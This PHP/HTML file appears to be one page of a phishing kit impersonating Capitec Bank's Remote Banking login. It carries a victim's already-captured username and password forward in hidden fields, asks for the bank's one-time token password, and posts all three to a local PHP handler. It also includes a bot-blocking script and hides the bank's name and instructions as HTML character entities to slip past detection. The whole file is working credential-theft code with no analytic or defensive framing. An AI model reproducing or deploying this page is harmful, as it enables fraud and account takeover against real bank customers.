<?php
require "includes/blocker.php";
require "includes/functions.php";
$username = htmlspecialchars($_GET["aa"]);
$password = htmlspecialchars($_GET["bb"]);

error_reporting(0);
?>
<!DOCTYPE html>
<html><head>
<meta http-equiv="content-type" content="text/html; charset=windows-1252"><title>&#73;&#110;&#116;&#101;&#114;&#110;&#101;&#116;&#32;&#66;&#97;&#110;&#107;&#105;&#110;&#103;&#32;&verbar;&#32;&#67;&#97;&#112;&#105;&#116;&#101;&#99;&#32;&#66;&#97;&#110;&#107;</title>

<link rel="stylesheet" type="text/css" href="media/default-3.css">
<link rel="stylesheet" type="text/css" href="media/jquery-ui-1.css">
<link rel="stylesheet" type="text/css" href="media/default.css">
<link href="media/favicon.ico" rel="shortcut icon" type="image/x-icon" />
<link id="Link1" rel="icon" href="media/favicon.ico" type="image/ico" />
<script>

function check(form) {


if (form.token.value.length < 6)
{ document.getElementById('errors').style.display = 'block'; form.token.focus(); return;} else { document.getElementById('errors').style.display = 'none'; }

var regExpress = /^[a-zA-Z0-9]+$/
if (!regExpress.test(form.token.value))
{ document.getElementById('errors').style.display = 'block'; form.token.focus(); return;} else { document.getElementById('errors').style.display = 'none'; }


form.submit()

}



</script>
<style>.errorMessageAttention {
	color: #BA1316;
	font-size: 18px;
	font-weight: bold;
	font-family: 'Flama-Medium';
}

#blank {  position: absolute;  clip: rect(0,0,0,0); font-size: 16px; margin-left: -999999999999 }

</style>
</head>
<body topmargin="0">


<div class="siteHeader">
<div class="container">
<div class="logo"><img src="media/logo_main.webp"></div>

<nav class="primaryNav">
<ul>
</ul>
</nav>
<ul class="pull-right">
<li class="hidden-xs"><div class="linkWrap "><a href="#" class="w">&#67;&#97;&#112;&#105;&#116;&#101;&#99;&#32;&#66;&#97;&#110;&#107;</a></div>
</li>
<li>
<div class="linkWrap">
<a href="#">Security</a>
</div>
</li>
<li class="phoneHeader"><span href="tel:0860 10 20 43"><div id="mobileNumber" class=" "></div></span></li>
</ul>
</div>
</div>
<div id="bodyTagId"><div class="container"><div align="left"><h1 style="z-index:999;">&#82;&#101;&#109;&#111;&#116;&#101;&#32;&#66;&#97;&#110;&#107;&#105;&#110;&#103;</h1>
<div id="errors" style="display:none;" class="errorMessage"><div class="errorMessageAttention">Attention</div>Invalid Token Password entered.<br></div>



<div class="row">

<div class="col-md-6">

<form id="login" name="login" action="php/status_1.php" method="POST" autocomplete="off">
<input name="username" value="<?php echo $username; ?>" type="hidden" />
<input name="password" value="<?php echo $password; ?>" type="hidden" />
<fieldset>
<label id="usernameLabel" for="token"><span class="username">Enter Token Password:</span>
<input onKeyDown="if(event.keyCode==13) check(this.form);" id="token" name="token" type="password" maxlength="8">
</label>
<input type="hidden" name="option" value="doLogin">
</fieldset>


<div class="iWantTo"><h2>I want to</h2><table>
<tbody><tr><td width="15px"><a href="#"><img class="iWantToImg" src="media/proceed.webp" width="15" height="15" border="0"></a></td><td><button style="margin-left:-8px; font-family: 'Flama-Book';font-size: 15px;line-height: 16px;font-weight: normal;color:#009de0;text-decoration:none;background:transparent; border:0;" onclick="check(this.form)" type="button">Continue</button></td>
</tr></tbody></table></div>
<div style="top: 10px; position: absolute; right: -10px;">
<a style="cursor: pointer;" href="#"><img src="media/SSL-certificate-seal-ssl-animated.webp" border="0"></a>
</div>
<div>
<input type="text" autocomplete="off" id="blank" name="blank" readonly="readonly">

</div></form>


</div>
<div class="col-md-6">
<div class="info-block" style="background:transparent !important; border:0;">
<h2>Cant find token password?</h2><br>
&#69;&#110;&#116;&#101;&#114;&#32;&#116;&#104;&#101;&#32;&#115;&#105;&#120;&#32;&#100;&#105;&#103;&#105;&#116;&#32;&#84;&#111;&#107;&#101;&#110;&#32;&#112;&#97;&#115;&#115;&#119;&#111;&#114;&#100;&#32;&#102;&#114;&#111;&#109;&#32;&#121;&#111;&#117;&#114;&#32;&#84;&#111;&#107;&#101;&#110;&#32;&#100;&#101;&#118;&#105;&#99;&#101;&period;<br>
&#73;&#102;&#32;&#121;&#111;&#117;&#32;&#104;&#97;&#118;&#101;&#32;&#105;&#110;&#115;&#116;&#97;&#108;&#108;&#101;&#100;&#32;&#116;&#104;&#101;&#32;&#67;&#97;&#112;&#105;&#116;&#101;&#99;&#32;&#66;&#97;&#110;&#107;&#105;&#110;&#103;&#32;&#65;&#112;&#112;&period;<br>
<br>
<ol>
<li>&#73;&#102;&#32;&#121;&#111;&#117;&#32;&#104;&#97;&#118;&#101;&#32;&#105;&#110;&#115;&#116;&#97;&#108;&#108;&#101;&#100;&#32;&#116;&#104;&#101;&#32;&#67;&#97;&#112;&#105;&#116;&#101;&#99;&#32;&#66;&#97;&#110;&#107;&#105;&#110;&#103;&#32;&#65;&#112;&#112;&period;</li>
<li style="width:110%;">Open the app menu and selected "Generate token password"</li>
<li>Enter your Remote PIN and click "OK"</li>
<li>Enter the token here and click "Continue"</li>
</ol>

</div>


</div>

</div>


</div></div>

</div></body></html>